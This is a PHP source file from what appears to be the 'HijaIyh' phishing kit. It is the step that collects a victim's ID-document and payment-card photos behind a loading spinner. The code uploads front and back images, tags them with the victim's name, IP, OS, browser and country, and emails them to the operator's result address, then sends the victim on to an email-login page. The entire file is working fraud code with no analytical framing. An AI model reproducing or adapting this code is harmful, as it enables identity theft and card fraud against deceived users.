<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
echo '<center><br><br><br><br><img src="./HijaIyh_App/assets/img/spinner2.gif" style="margin-top:20%"></center>';

if(isset($_GET['type']) && isset($_FILES)){
			$filename = $core->session('firstname').'_'.$core->session('lastname');

			if($_GET['type'] == 'id')
			{

				$upload_id_front = $core->UploadImage('uploadid_front','ID_FRONT_'.$filename);
				$upload_id_back = $core->UploadImage('uploadid_back','ID_BACK_'.$filename);

				if($upload_id_front !== false && $upload_id_back !== false){
					$lphoto = array($upload_id_front,$upload_id_back);

					$info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
					$sendSubj = "PHOTO IDENTITY : ".$core->session('firstname')." ".$core->session('lastname')." // $info";
					$sendFrom = "#HijaIyh:App";
					$core->sendPhoto($email_result,$sendFrom,$sendSubj,$lphoto);
					$core->stats('photo','Successfully uploaded ID photo '); 
				}else{
					echo "<script>alert('Extension not allowed, please choose a JPEG or PNG file.');window.location.href='?page=".$core->mobile_link('photo')."&type=id&appIdKey=".$appidkey."&locale=".$localex."';</script>";exit;
				}
				$core->redirect('?page='.$core->mobile_link('photo').'&type=card&appIdKey='.$appidkey.'&locale='.$localex);
			}elseif($_GET['type'] == 'card'){
			
			$upload_cc_front =$core->UploadImage('uploadcc_front','CC_FRONT_'.$filename);
			$upload_cc_back = $core->UploadImage('uploadcc_back','CC_BACK_'.$filename);

			if($upload_cc_front !== false && $upload_cc_back !== false)
			{
				$lphoto = array($upload_cc_front,$upload_cc_back);
    			$info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
				$sendSubj = "PHOTO WITH CARD : ".$core->session('firstname')." ".$core->session('lastname')." // $info";
				$sendFrom = "#HijaIyh:App";
				$core->sendPhoto($email_result,$sendFrom,$sendSubj,$lphoto);
				$core->stats('photo','Successfully uploaded CC photo '); 

				
			}else{
				echo "<script>alert('Extension not allowed, please choose a JPEG or PNG file.');window.location.href='?page=".$core->mobile_link('photo')."&type=card&appIdKey=".$appidkey."&locale=".$localex."';</script>";exit;
			}
		}

	if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = $core->mobile_link('email');
                }else{
                    $kemana = $core->mobile_link('finish');
                }
                $core->redirect('?page='.$kemana.'&appIdKey='.$appidkey.'&locale='.$localex);
}